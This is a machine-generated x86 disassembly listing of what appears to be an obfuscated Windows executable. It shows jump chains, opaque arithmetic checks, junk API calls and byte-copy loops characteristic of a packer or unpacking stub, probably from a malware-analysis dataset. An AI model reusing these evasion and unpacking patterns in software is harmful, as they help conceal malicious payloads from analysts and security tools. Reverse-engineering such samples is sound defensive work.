0x00401000:	pushl	%ebp	; from: 0x0041f08e(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	jmp	0x00401312	; targets: 0x00401312(MAY)
0x00401312:	subl	$0x28, %esp	; from: 0x00401003(MAY)
0x00401315:	pushl	%esi
0x00401316:	movl	$0x345f3ee8, -40(%ebp)
0x0040131d:	movl	$0xdedbe5ac, %eax
0x00401322:	movl	%eax, -36(%ebp)
0x00401325:	movl	$0x345f3eec, -32(%ebp)
0x0040132c:	movl	%eax, -28(%ebp)
0x0040132f:	movl	$0x3daf, -8(%ebp)
0x00401336:	movl	-8(%ebp), %eax
0x00401339:	xorl	$0x4a98, %eax
0x0040133e:	orl	$0x3564, %eax
0x00401343:	shrl	%eax
0x00401345:	addl	$0x3ebf, %eax
0x0040134a:	orl	$0x71f6, %eax
0x0040134f:	movl	%eax, -28(%ebp)
0x00401352:	movl	$0x7868, -20(%ebp)
0x00401359:	movl	$0x2955, -16(%ebp)
0x00401360:	movl	$0x2d5e, -12(%ebp)
0x00401367:	movl	$0x2, -8(%ebp)
0x0040136e:	movl	-8(%ebp), %ecx
0x00401371:	movl	-12(%ebp), %eax
0x00401374:	xorl	%edx, %edx
0x00401376:	jmp	0x00401685	; targets: 0x00401685(MAY)
0x00401685:	divl	%ecx, %eax	; from: 0x00401376(MAY)
0x00401687:	movl	-16(%ebp), %ecx
0x0040168a:	subl	%ecx, %eax
0x0040168c:	movl	-20(%ebp), %ecx
0x0040168f:	andl	$0x58af, %eax
0x00401694:	imull	$0x7420, %eax, %eax
0x0040169a:	subl	%ecx, %eax
0x0040169c:	movl	-28(%ebp), %ecx
0x0040169f:	cmpl	%eax, %ecx
0x004016a1:	ja	0x00404618	; targets: 0x004016a7(MAY), 0x00404618(MAY)
0x004016a7:	movb	0x0042f666, %al	; from: 0x004016a1(MAY)
0x004016ac:	movb	0x0042f665, %cl
0x004016b2:	jmp	0x004019c1	; targets: 0x004019c1(MAY)
0x004019c1:	addb	%cl, %al	; from: 0x004016b2(MAY)
0x004019c3:	movb	0x0042f664, %cl
0x004019c9:	movzbl	%al, %eax
0x004019cc:	movzbl	%cl, %ecx
0x004019cf:	cltd	
0x004019d0:	idivl	%ecx, %eax
0x004019d2:	jmp	0x00401ce1	; targets: 0x00401ce1(MAY)
0x00401ce1:	movb	$0x4b, %cl	; from: 0x004019d2(MAY)
0x00401ce3:	jmp	0x00401ff2	; targets: 0x00401ff2(MAY)
0x00401ff2:	imulb	%cl, %al	; from: 0x00401ce3(MAY)
0x00401ff4:	movb	$0xffffffe6, %cl
0x00401ff6:	xorl	$0xe, %eax
0x00401ff9:	movb	%al, -5(%ebp)
0x00401ffc:	movb	$0xffffffe4, -2(%ebp)
0x00402000:	movb	$0x6d, -1(%ebp)
0x00402004:	movb	-1(%ebp), %al
0x00402007:	imulb	%cl, %al
0x00402009:	movb	0x0042f667, %cl
0x0040200f:	xorb	%cl, %al
0x00402011:	movb	-2(%ebp), %cl
0x00402014:	orb	%al, %cl
0x00402016:	movb	-5(%ebp), %al
0x00402019:	cmpb	%cl, %al
0x0040201b:	je	0x00404618	; targets: 0x00404618(MAY), 0x00402021(MAY)
0x00402021:	movl	$0x5049, -32(%ebp)	; from: 0x0040201b(MAY)
0x00402028:	pushl	$0x135b
0x0040202d:	movl	$0x7bc8, -28(%ebp)
0x00402034:	movl	-32(%ebp), %eax
0x00402037:	movl	-28(%ebp), %ecx
0x0040203a:	pushl	$0x75fc
0x0040203f:	pushl	%ecx
0x00402040:	pushl	%eax
0x00402041:	call	0x0041eea3	; targets: 0x0041eea3(MAY)
0x00402046:	movl	0x0042f668, %ecx	; from: 0x0041ef18(MAY)
0x0040204c:	movl	0x0042f66c, %esi
0x00402052:	pushl	$0x2182a8e
0x00402057:	pushl	$0x1c7cc0d
0x0040205c:	xorl	%esi, %edx
0x0040205e:	jmp	0x0040236d	; targets: 0x0040236d(MAY)
0x0040236d:	xorl	%ecx, %eax	; from: 0x0040205e(MAY)
0x0040236f:	jmp	0x0040267e	; targets: 0x0040267e(MAY)
0x0040267e:	pushl	%edx	; from: 0x0040236f(MAY)
0x0040267f:	pushl	%eax
0x00402680:	call	0x0041eea3	; targets: 0x0041eea3(MAY)
0x00402685:	orl	$0xa26, %eax	; from: 0x0041ef18(MAY)
0x0040268a:	movl	%eax, -32(%ebp)
0x0040268d:	orl	$0x2055, %edx
0x00402693:	jmp	0x004029a2	; targets: 0x004029a2(MAY)
0x004029a2:	movl	%edx, -28(%ebp)	; from: 0x00402693(MAY)
0x004029a5:	movl	$0x7889, %eax
0x004029aa:	movw	%ax, -8(%ebp)
0x004029ae:	jmp	0x00402cbd	; targets: 0x00402cbd(MAY)
0x00402cbd:	movw	0x0042f678, %ax	; from: 0x004029ae(MAY)
0x00402cc3:	movzwl	%ax, %ecx
0x00402cc6:	movw	0x0042f674, %ax
0x00402ccc:	movzwl	%ax, %eax
0x00402ccf:	cltd	
0x00402cd0:	idivl	%ecx, %eax
0x00402cd2:	movzwl	%ax, %ecx
0x00402cd5:	jmp	0x00402fe4	; targets: 0x00402fe4(MAY)
0x00402fe4:	movw	0x0042f670, %ax	; from: 0x00402cd5(MAY)
0x00402fea:	movzwl	%ax, %eax
0x00402fed:	xorl	%ecx, %eax
0x00402fef:	jmp	0x004032fe	; targets: 0x004032fe(MAY)
0x004032fe:	movzwl	-8(%ebp), %ecx	; from: 0x00402fef(MAY)
0x00403302:	orl	%eax, %ecx
0x00403304:	movw	%cx, -8(%ebp)
0x00403308:	movl	0x0042f684, %eax
0x0040330d:	cmpl	$0x2809a89a, %eax
0x00403312:	jne	0x00404618	; targets: 0x00403318(MAY)
0x00403318:	movl	-40(%ebp), %eax	; from: 0x00403312(MAY)
0x0040331b:	movl	-36(%ebp), %ecx
0x0040331e:	movl	-40(%ebp), %edx
0x00403321:	movl	-36(%ebp), %esi
0x00403324:	jmp	0x00403633	; targets: 0x00403633(MAY)
0x00403633:	shrdl	$0x2, %ecx, %eax	; from: 0x00403324(MAY)
0x00403637:	shll	$0x1e, %edx
0x0040363a:	movl	0x0042f268, %edx
0x00403640:	movl	0x1a8(%edx), %edx
0x00403646:	shrl	$0x2, %ecx
0x00403649:	movl	$0xd17cfba, %ecx
0x0040364e:	xorl	%ecx, %eax
0x00403650:	xorl	%esi, %esi
0x00403652:	jmp	0x00403961	; targets: 0x00403961(MAY)
0x00403961:	orl	%esi, %eax	; from: 0x00403652(MAY)
0x00403963:	movl	%eax, (%edx)
0x00403965:	jmp	0x00403c74	; targets: 0x00403c74(MAY)
0x00403c74:	movl	-40(%ebp), %eax	; from: 0x00403965(MAY)
0x00403c77:	movl	-36(%ebp), %edx
0x00403c7a:	shrdl	$0x2, %edx, %eax
0x00403c7e:	shrl	$0x2, %edx
0x00403c81:	movl	-40(%ebp), %edx
0x00403c84:	movl	-36(%ebp), %esi
0x00403c87:	jmp	0x00403f96	; targets: 0x00403f96(MAY)
0x00403f96:	xorl	%ecx, %eax	; from: 0x00403c87(MAY)
0x00403f98:	xorl	%esi, %esi
0x00403f9a:	orl	%esi, %eax
0x00403f9c:	movl	%eax, 0x0042f684
0x00403fa1:	movb	$0xffffffa6, -5(%ebp)
0x00403fa5:	movb	-5(%ebp), %al
0x00403fa8:	subb	$0x6, %al
0x00403faa:	orb	$0xfffffff0, %al
0x00403fac:	jmp	0x004042bb	; targets: 0x004042bb(MAY)
0x004042bb:	shll	$0x1e, %edx	; from: 0x00403fac(MAY)
0x004042be:	movb	%al, -5(%ebp)
0x004042c1:	movb	0x0042f67c, %dl
0x004042c7:	movb	0x0042f67b, %al
0x004042cc:	xorb	$0xffffffa4, %dl
0x004042cf:	imulb	%dl, %al
0x004042d1:	movb	$0xffffff8f, %dl
0x004042d3:	imulb	%dl, %al
0x004042d5:	movb	0x0042f67a, %dl
0x004042db:	andb	%al, %dl
0x004042dd:	movb	-5(%ebp), %al
0x004042e0:	cmpb	%dl, %al
0x004042e2:	jb	0x00404618	; targets: 0x004042e8(MAY)
0x004042e8:	movl	-40(%ebp), %eax	; from: 0x004042e2(MAY)
0x004042eb:	movl	-36(%ebp), %edx
0x004042ee:	shrdl	$0x2, %edx, %eax
0x004042f2:	xorl	%ecx, %eax
0x004042f4:	movl	-40(%ebp), %ecx
0x004042f7:	shrl	$0x2, %edx
0x004042fa:	movl	-36(%ebp), %edx
0x004042fd:	xorl	%edx, %edx
0x004042ff:	shll	$0x1e, %ecx
0x00404302:	jmp	0x00404611	; targets: 0x00404611(MAY)
0x00404611:	orl	%edx, %eax	; from: 0x00404302(MAY)
0x00404613:	movl	%eax, 0x0042f370
0x00404618:	popl	%esi	; from: 0x004016a1(MAY), 0x0040201b(MAY)
0x00404619:	leave	
0x0040461a:	ret	; targets: 0x0041f093(MAY)

0x00415287:	pushl	%ebp	; from: 0x00420be7(MAY)
0x00415288:	movl	%esp, %ebp
0x0041528a:	subl	$0xac, %esp
0x00415290:	pushl	%ebx
0x00415291:	pushl	%esi
0x00415292:	movl	$0x7dea, -8(%ebp)
0x00415299:	xorl	%esi, %esi
0x0041529b:	incl	%esi
0x0041e595:	pushl	%ebp	; from: 0x0041f118(MAY)
0x0041e596:	movl	%esp, %ebp
0x0041e598:	subl	$0x1c, %esp
0x0041e59b:	movl	$0x499, -4(%ebp)
0x0041e5a2:	movl	$0x27dc, -12(%ebp)
0x0041e5a9:	movl	$0x7671, -8(%ebp)
0x0041e5b0:	movl	-4(%ebp), %ecx
0x0041e5b3:	addl	$0x309f, %ecx
0x0041e5b9:	orl	$0x542c, %ecx
0x0041e5bf:	xorl	$0x145a, %ecx
0x0041e5c5:	shrl	%ecx
0x0041e5c7:	pushl	%esi
0x0041e5c8:	addl	$0x1efe, %ecx
0x0041e5ce:	pushl	%edi
0x0041e5cf:	movl	$0x6d13, -4(%ebp)	; from: 0x0041e663(MAY)
0x0041e5d6:	movl	0x0042f620, %eax
0x0041e5db:	imull	$0xfffff264, %eax, %eax
0x0041e5e1:	andl	$0x531c, %eax
0x0041e5e6:	movl	%ecx, %edx
0x0041e5e8:	subl	%eax, %edx
0x0041e5ea:	movl	0x8(%ebp), %eax
0x0041e5ed:	leal	-46681(%edx,%eax), %eax
0x0041e5f4:	movl	0x0042f61c, %edx
0x0041e5fa:	addl	%edx, %eax
0x0041e5fc:	movl	-4(%ebp), %edx
0x0041e5ff:	movl	0x0042f624, %esi
0x0041e605:	movb	(%eax), %al
0x0041e607:	andl	$0x5ce, %edx
0x0041e60d:	xorl	$0x7a8f, %edx
0x0041e613:	imull	%esi, %edx
0x0041e616:	movl	0x0042f268, %esi
0x0041e61c:	movl	0x1cc(%esi), %esi
0x0041e622:	subl	%edx, %esi
0x0041e624:	movb	%al, 0x593294c(%esi,%ecx)
0x0041e62b:	movl	-8(%ebp), %eax
0x0041e62e:	addl	-12(%ebp), %eax
0x0041e631:	pushl	$0x1a
0x0041e633:	imull	$0x2cd7, %eax, %eax
0x0041e639:	orl	$0x1c8c, %eax
0x0041e63e:	xorl	$0x1bba3eae, %eax
0x0041e643:	addl	%eax, %ecx
0x0041e645:	movl	0x0042f618, %eax
0x0041e64a:	movl	0x0042f614, %edx
0x0041e650:	xorl	%edx, %eax
0x0041e652:	orl	$0x509b, %eax
0x0041e657:	xorl	%edx, %edx
0x0041e659:	popl	%esi
0x0041e65a:	divl	%esi, %eax
0x0041e65c:	addl	$0x4ad3, %eax
0x0041e661:	cmpl	%eax, %ecx
0x0041e663:	jne	0x0041e5cf	; targets: 0x0041e5cf(MAY), 0x0041e669(MAY)
0x0041e669:	movl	$0x59f0, -28(%ebp)	; from: 0x0041e663(MAY)
0x0041e670:	movl	$0x7953, -24(%ebp)
0x0041e677:	movl	$0x1c5b, -20(%ebp)
0x0041e67e:	movl	$0x7017, -16(%ebp)
0x0041e685:	movl	0x0042f62c, %eax
0x0041e68a:	addl	$0x1599, %eax
0x0041e68f:	pushl	$0x3
0x0041e691:	popl	%ecx
0x0041e692:	xorl	$0x74d6, %eax
0x0041e697:	xorl	%edx, %edx
0x0041e699:	divl	%ecx, %eax
0x0041e69b:	movl	0x0042f628, %ecx
0x0041e6a1:	pushl	%ebx
0x0041e6a2:	imull	%eax, %ecx
0x0041e6a5:	andl	$0x22fc, %ecx
0x0041e6ab:	addl	$0x1a4b, %ecx
0x0041e6b1:	movl	$0x451e, 0x8(%ebp)	; from: 0x0041e764(MAY)
0x0041e6b8:	movl	$0x4ee6, -4(%ebp)
0x0041e6bf:	movl	$0x2929, -8(%ebp)
0x0041e6c6:	movl	$0x552, -12(%ebp)
0x0041e6cd:	movl	0x8(%ebp), %eax
0x0041e6d0:	movl	0x0042f63c, %esi
0x0041e6d6:	addl	$0x403b, %eax
0x0041e6db:	orl	$0x4c44, %eax
0x0041e6e0:	xorl	%edx, %edx
0x0041e6e2:	divl	%esi, %eax
0x0041e6e4:	movl	0x0042f638, %edx
0x0041e6ea:	movl	%ecx, %esi
0x0041e6ec:	pushl	$0x3
0x0041e6ee:	popl	%edi
0x0041e6ef:	addl	$0x6a54, %eax
0x0041e6f4:	andl	%eax, %edx
0x0041e6f6:	movl	0x0042f640, %eax
0x0041e6fb:	xorl	$0x2b59, %edx
0x0041e701:	subl	%edx, %esi
0x0041e703:	xorl	%edx, %edx
0x0041e705:	divl	%edi, %eax
0x0041e707:	movl	-12(%ebp), %edx
0x0041e70a:	addl	0xc(%ebp), %esi
0x0041e70d:	andl	%eax, %edx
0x0041e70f:	movl	-8(%ebp), %eax
0x0041e712:	orl	%eax, %edx
0x0041e714:	movl	0x0042f268, %eax
0x0041e719:	movl	0x1d0(%eax), %eax
0x0041e71f:	subl	%edx, %eax
0x0041e721:	movl	-4(%ebp), %edx
0x0041e724:	movb	(%esi), %bl
0x0041e726:	leal	-24536(%eax,%ecx), %eax
0x0041e72d:	movb	%bl, (%edx,%eax)
0x0041e730:	movl	-16(%ebp), %eax
0x0041e733:	movl	-20(%ebp), %edx
0x0041e736:	andl	$0x1b00, %eax
0x0041e73b:	imull	%edx, %eax
0x0041e73e:	leal	-29732863(%ecx,%eax), %ecx
0x0041e745:	movl	-24(%ebp), %eax
0x0041e748:	movl	-28(%ebp), %edx
0x0041e74b:	orl	%edx, %eax
0x0041e74d:	movl	0x0042f630, %edx
0x0041e753:	subl	%edx, %eax
0x0041e755:	movl	0x0042f634, %edx
0x0041e75b:	addl	$0xffff9d5a, %eax
0x0041e760:	addl	%eax, %edx
0x0041e762:	cmpl	%edx, %ecx
0x0041e764:	jne	0x0041e6b1	; targets: 0x0041e76a(MAY), 0x0041e6b1(MAY)
0x0041e76a:	movl	$0x377c, -28(%ebp)	; from: 0x0041e764(MAY)
0x0041e771:	movl	0x0042f64c, %eax
0x0041e776:	movl	0x0042f648, %ecx
0x0041e77c:	imull	%ecx, %eax
0x0041e77f:	movl	0x0042f644, %ecx
0x0041e785:	movl	0x0042f654, %esi
0x0041e78b:	xorl	%eax, %ecx
0x0041e78d:	movl	0x0042f650, %eax
0x0041e792:	imull	$0x6da8, %ecx, %ecx
0x0041e798:	xorl	%edx, %edx
0x0041e79a:	subl	$0x57fc2052, %ecx
0x0041e7a0:	divl	%esi, %eax
0x0041e7a2:	movl	$0x2d46d183, %esi
0x0041e7a7:	popl	%ebx
0x0041e7a8:	jmp	0x0041e842	; targets: 0x0041e842(MAY)
0x0041e7ad:	movl	$0x298c, 0xc(%ebp)	; from: 0x0041e84c(MAY)
0x0041e7b4:	movl	$0x331a, 0x8(%ebp)
0x0041e7bb:	movl	0x8(%ebp), %eax
0x0041e7be:	movl	0xc(%ebp), %edx
0x0041e7c1:	andl	$0x52d1, %eax
0x0041e7c6:	addl	$0x5542, %eax
0x0041e7cb:	imull	%edx, %eax
0x0041e7ce:	movl	0x0042f660, %edx
0x0041e7d4:	imull	$0x5780, %eax, %eax
0x0041e7da:	movl	0x0042f268, %edi
0x0041e7e0:	movl	0x1d4(%edi), %edi
0x0041e7e6:	subl	$0x6fb, %edx
0x0041e7ec:	andl	$0xc14, %edx
0x0041e7f2:	orl	$0x40aa, %edx
0x0041e7f8:	addl	%ecx, %eax
0x0041e7fa:	xorl	$0x5148, %edx
0x0041e800:	subl	%edx, %edi
0x0041e802:	movl	0x10(%ebp), %edx
0x0041e805:	movb	-900263414(%eax,%edx), %al
0x0041e80c:	movb	%al, (%edi,%ecx)
0x0041e80f:	movl	0x0042f65c, %eax
0x0041e814:	movl	0x0042f658, %edx
0x0041e81a:	subl	$0x511a, %eax
0x0041e81f:	xorl	$0x46da, %eax
0x0041e824:	imull	%eax, %edx
0x0041e827:	movl	-28(%ebp), %eax
0x0041e82a:	movl	0x0042f654, %edi
0x0041e830:	addl	%edx, %eax
0x0041e832:	xorl	$0xf7bf60ed, %eax
0x0041e837:	addl	%eax, %ecx
0x0041e839:	movl	0x0042f650, %eax
0x0041e83e:	xorl	%edx, %edx
0x0041e840:	divl	%edi, %eax
0x0041e842:	imull	$0xcf8b424, %eax, %eax	; from: 0x0041e7a8(MAY)
0x0041e848:	subl	%esi, %eax
0x0041e84a:	cmpl	%eax, %ecx
0x0041e84c:	jbe	0x0041e7ad	; targets: 0x0041e7ad(MAY), 0x0041e852(MAY)
0x0041e852:	popl	%edi	; from: 0x0041e84c(MAY)
0x0041e853:	popl	%esi
0x0041e854:	leave	
0x0041e855:	ret	$0xc	; targets: 0x0041f11d(MAY)

0x0041eea3:	movzwl	0x004214b7, %eax	; from: 0x00402680(MAY), 0x00402041(MAY)
0x0041eeaa:	adcl	%eax, 0x004213af
0x0041eeb0:	movl	0x8(%esp), %eax
0x0041eeb4:	andl	0x004213bf, %ecx
0x0041eeba:	movl	0x10(%esp), %ecx
0x0041eebe:	orl	%eax, %ecx
0x0041eec0:	movl	$0x22f6, 0x004216d3
0x0041eeca:	movl	0xc(%esp), %ecx
0x0041eece:	jne	0x0041eee7	; targets: 0x0041eee7(MAY)
0x0041eee7:	incl	0x0042140f	; from: 0x0041eece(MAY)
0x0041eeed:	pushl	%ebx
0x0041eeee:	movzbl	0x0042149f, %ebx
0x0041eef5:	sbbl	0x0042133f, %ebx
0x0041eefb:	movl	%ebx, 0x0042149f
0x0041ef01:	mull	%ecx, %eax
0x0041ef03:	movl	%eax, %ebx
0x0041ef05:	movl	0x8(%esp), %eax
0x0041ef09:	mull	0x14(%esp), %eax
0x0041ef0d:	addl	%eax, %ebx
0x0041ef0f:	movl	0x8(%esp), %eax
0x0041ef13:	mull	%ecx, %eax
0x0041ef15:	addl	%ebx, %edx
0x0041ef17:	popl	%ebx
0x0041ef18:	ret	$0x10	; targets: 0x00402685(MAY), 0x00402046(MAY)


start:
0x0041f016:	pushl	%ebp
0x0041f017:	movl	%esp, %ebp
0x0041f019:	andl	$0xfffffff8, %esp
0x0041f01c:	subl	$0x20c, %esp
0x0041f022:	pushl	%ebx
0x0041f023:	pushl	%esi
0x0041f024:	pushl	%edi
0x0041f025:	pushl	$0x6
0x0041f027:	popl	%esi
0x0041f028:	movl	0x0042f04c, %eax	; from: 0x0041f06b(MAY)
0x0041f02d:	incl	%eax
0x0041f02e:	pushl	%eax
0x0041f02f:	call	strlen@msvcrt.dll	; targets: 0xff000050(MAY)
0x0041f035:	movl	%eax, %edi
0x0041f037:	movl	0x0042f07c, %eax
0x0041f03c:	popl	%ecx
0x0041f03d:	addl	$0x2, %eax
0x0041f040:	pushl	%eax
0x0041f041:	call	wcslen@msvcrt.dll	; targets: 0xff000240(MAY)
0x0041f047:	popl	%ecx
0x0041f048:	cmpl	%edi, %eax
0x0041f04a:	je	0x0041f66c	; targets: 0x0041f66c(MAY), 0x0041f050(MAY)
0x0041f050:	pushl	0x0042f07c	; from: 0x0041f04a(MAY)
0x0041f056:	call	RemoveDirectoryW@kernel32.dll	; targets: 0xff000190(MAY)
0x0041f05c:	testl	%eax, %eax
0x0041f05e:	jne	0x0041f652	; targets: 0x0041f064(MAY), 0x0041f652(MAY)
0x0041f064:	incl	%esi	; from: 0x0041f05e(MAY)
0x0041f065:	cmpl	$0x20b, %esi
0x0041f06b:	jb	0x0041f028	; targets: 0x0041f071(MAY), 0x0041f028(MAY)
0x0041f071:	movl	$0x345f3ee8, 0x18(%esp)	; from: 0x0041f06b(MAY)
0x0041f079:	movl	$0xdedbe5ac, %ebx
0x0041f07e:	movl	%ebx, 0x1c(%esp)
0x0041f082:	movl	$0x345f3eec, 0x38(%esp)
0x0041f08a:	movl	%ebx, 0x3c(%esp)
0x0041f08e:	call	0x00401000	; targets: 0x00401000(MAY)
0x0041f093:	leal	0x60(%esp), %eax	; from: 0x0040461a(MAY)
0x0041f097:	movl	%eax, 0xb4(%esp)
0x0041f09e:	leal	0x5c(%esp), %eax
0x0041f0a2:	movl	%eax, 0x48(%esp)
0x0041f0a6:	movl	0x0042f268, %eax
0x0041f0ab:	movl	0x1d8(%eax), %eax
0x0041f0b1:	movl	(%eax), %eax
0x0041f0b3:	movl	%eax, %ecx
0x0041f0b5:	notl	%eax
0x0041f0b7:	shll	$0x1e, %eax
0x0041f0ba:	movl	$0xdb6988ff, %edi
0x0041f0bf:	xorl	%edi, %ecx
0x0041f0c1:	shrl	$0x2, %ecx
0x0041f0c4:	orl	%eax, %ecx
0x0041f0c6:	movl	0x48(%esp), %eax
0x0041f0ca:	movl	%ecx, (%eax)
0x0041f0cc:	movl	0x0042f268, %ecx
0x0041f0d2:	movl	0x19c(%ecx), %ecx
0x0041f0d8:	movl	(%ecx), %ecx
0x0041f0da:	movl	$0x345f3ef8, %eax
0x0041f0df:	movl	%eax, 0x210(%esp)
0x0041f0e6:	movl	%ebx, 0x214(%esp)
0x0041f0ed:	movl	%ecx, 0xf8(%esp)
0x0041f0f4:	movl	%eax, 0x20(%esp)
0x0041f0f8:	movl	%ebx, 0x24(%esp)
0x0041f0fc:	movl	%eax, 0x20(%esp)
0x0041f100:	movl	%ebx, 0x24(%esp)
0x0041f104:	movl	%eax, 0x20(%esp)
0x0041f108:	leal	0x10(%ebp), %eax
0x0041f10b:	pushl	%eax
0x0041f10c:	leal	0xc(%ebp), %eax
0x0041f10f:	pushl	%eax
0x0041f110:	leal	0x8(%ebp), %eax
0x0041f113:	movl	%ebx, 0x2c(%esp)
0x0041f117:	pushl	%eax
0x0041f118:	call	0x0041e595	; targets: 0x0041e595(MAY)
0x0041f11d:	movl	0x0042f0ec, %ecx	; from: 0x0041e855(MAY)
0x0041f123:	movl	0x0042f0ec, %eax
0x0041f128:	shll	$0x2, %eax
0x0041f12b:	shrl	$0x1e, %ecx
0x0041f12e:	orl	%ecx, %eax
0x0041f130:	movl	0xb4(%esp), %ecx
0x0041f137:	xorl	%edi, %eax
0x0041f139:	movl	%eax, (%ecx)
0x0041f13b:	movl	0x50(%esp), %ecx
0x0041f13f:	leal	0x50(%esp), %eax
0x0041f143:	movl	%eax, 0x64(%esp)
0x0041f147:	leal	0x64(%esp), %eax
0x0041f14b:	movl	%eax, 0x1ac(%esp)
0x0041f152:	movl	0x50(%esp), %eax
0x0041f156:	subl	%ecx, %eax
0x0041f158:	leal	0x4(%ebp), %ecx
0x0041f15b:	xorl	%ecx, %eax
0x0041f15d:	xorl	%ecx, %ecx
0x0041f15f:	movl	%eax, 0x50(%esp)
0x0041f163:	movl	$0xd17cfba, %esi
0x0041f168:	xorl	%esi, %eax
0x0041f16a:	xorl	$0xf7b6f96b, %ecx
0x0041f170:	shldl	$0x2, %eax, %ecx
0x0041f174:	movl	%ecx, 0x24(%esp)
0x0041f178:	movl	0x18(%esp), %ecx
0x0041f17c:	movl	0x1c(%esp), %edx
0x0041f180:	shll	$0x2, %eax
0x0041f183:	cmpl	%ecx, %eax
0x0041f185:	jne	0x0041f195	; targets: 0x0041f195(MAY), 0x0041f18b(MAY)
0x0041f18b:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f185(MAY)
0x0041f18f:	je	0x00420bff	; targets: 0x0041f195(MAY), 0x00420bff(MAY)
0x0041f195:	movl	0x60(%esp), %eax	; from: 0x0041f185(MAY), 0x0041f18f(MAY)
0x0041f199:	cmpl	$0xdb6988fb, %eax
0x0041f19e:	je	0x0041f1ed	; targets: 0x0041f1a4(MAY), 0x0041f1ed(MAY)
0x0041f1a4:	movl	0x18(%esp), %edx	; from: 0x0041f19e(MAY)
0x0041f1a8:	movl	0x1c(%esp), %eax
0x0041f1ac:	xorl	%ebx, %eax
0x0041f1ae:	xorl	$0x345f3eeb, %edx
0x0041f1b4:	shrdl	$0x2, %eax, %edx
0x0041f1b8:	shrl	$0x2, %eax
0x0041f1bb:	movl	%eax, 0x24(%esp)
0x0041f1bf:	movl	0x18(%esp), %eax
0x0041f1c3:	movl	0x1c(%esp), %ecx
0x0041f1c7:	shll	$0x1e, %eax
0x0041f1ca:	orl	0x24(%esp), %eax
0x0041f1ce:	xorl	%ecx, %ecx
0x0041f1d0:	movl	%eax, 0x24(%esp)
0x0041f1d4:	movl	0x5c(%esp), %eax
0x0041f1d8:	orl	%edx, %ecx
0x0041f1da:	cltd	
0x0041f1db:	cmpl	%eax, %ecx
0x0041f1dd:	jne	0x00420bff	; targets: 0x0041f1e3(MAY)
0x0041f1e3:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f1dd(MAY)
0x0041f1e7:	jne	0x00420bff	; targets: 0x0041f1ed(MAY)
0x0041f1ed:	movl	$0x42f304, 0xe0(%esp)	; from: 0x0041f19e(MAY), 0x0041f1e7(MAY)
0x0041f1f8:	movl	$0x42f2fc, 0xe8(%esp)
0x0041f203:	movl	0xf8(%esp), %eax
0x0041f20a:	movl	0xf8(%esp), %eax
0x0041f211:	xorl	%ecx, %ecx
0x0041f213:	xorl	%esi, %eax
0x0041f215:	xorl	$0xf7b6f96b, %ecx
0x0041f21b:	shldl	$0x2, %eax, %ecx
0x0041f21f:	movl	%ecx, 0x24(%esp)
0x0041f223:	movl	0x18(%esp), %ecx
0x0041f227:	movl	0x1c(%esp), %edx
0x0041f22b:	shll	$0x2, %eax
0x0041f22e:	cmpl	%eax, %ecx
0x0041f230:	jne	0x00420ba8	; targets: 0x00420ba8(MAY)
0x0041f652:	pushl	$0x7566754	; from: 0x0041f05e(MAY)
0x0041f657:	pushl	$0x87657654
0x0041f65c:	pushl	$0x86776565
0x0041f661:	pushl	$0x87567654
0x0041f666:	call	GetModuleBaseNameA@psapi.dll	; targets: 0xff000260(MAY)
0x0041f66c:	xorl	%eax, %eax	; from: 0x0041f04a(MAY)
0x0041f66e:	jmp	0x00420c22	; targets: 0x00420c22(MAY)
0x00420ba8:	movl	0xe8(%esp), %eax	; from: 0x0041f230(MAY)
0x00420baf:	movl	0xe8(%esp), %ecx
0x00420bb6:	movl	(%eax), %eax
0x00420bb8:	cmpl	(%ecx), %eax
0x00420bba:	jne	0x00420bff	; targets: 0x00420bc0(MAY), 0x00420bff(MAY)
0x00420bc0:	movl	0xe0(%esp), %eax	; from: 0x00420bba(MAY)
0x00420bc7:	movl	0xe0(%esp), %ecx
0x00420bce:	movl	(%eax), %eax
0x00420bd0:	cmpl	(%ecx), %eax
0x00420bd2:	jne	0x00420bff	; targets: 0x00420bff(MAY), 0x00420bd8(MAY)
0x00420bd8:	leal	0x1ac(%esp), %eax	; from: 0x00420bd2(MAY)
0x00420bdf:	pushl	%eax
0x00420be0:	leal	0x108(%esp), %edi
0x00420be7:	call	0x00415287	; targets: 0x00415287(MAY)
0x00420bff:	leal	0x104(%esp), %eax	; from: 0x00420bd2(MAY), 0x00420bba(MAY), 0x0041f18f(MAY)
0x00420c06:	pushl	%eax
0x00420c07:	leal	0x64(%esp), %eax
0x00420c0b:	pushl	%eax
0x00420c0c:	pushl	0x58(%esp)
0x00420c10:	leal	0x68(%esp), %eax
0x00420c14:	call	0x00420c2b	; targets: 0x00420c2b(MAY)
0x00420c22:	popl	%edi	; from: 0x0041f66e(MAY)
0x00420c23:	popl	%esi
0x00420c24:	popl	%ebx
0x00420c25:	movl	%ebp, %esp
0x00420c27:	popl	%ebp
0x00420c28:	ret	$0xc	; targets: 0xfee70000(MAY)

0x00420c2b:	pushl	%ebp	; from: 0x00420c14(MAY)
0x00420c2c:	movl	%esp, %ebp
0x00420c2e:	subl	$0x10, %esp
0x00420c31:	pushl	%ebx
0x00420c32:	pushl	%esi
0x00420c33:	addl	%ebx, %esi
0x00420c35:	movl	0x0042151f, %ebx
0x00420c3b:	xorl	%esi, %esi
0x00420c3d:	orl	0x0042163f, %esi
0x00420c43:	subl	%esi, %ebx
0x00420c45:	imull	(%ebx,%esi), %ebx
0x00420c49:	movzwl	0x004216cb, %ebx
0x00420c50:	andl	%ebx, 0x0042177b
0x00420c56:	subl	%edi, 0x004214e3
0x00420c5c:	orl	$0x73a1, 0x004216a3
0x00420c66:	incl	0x004216c3
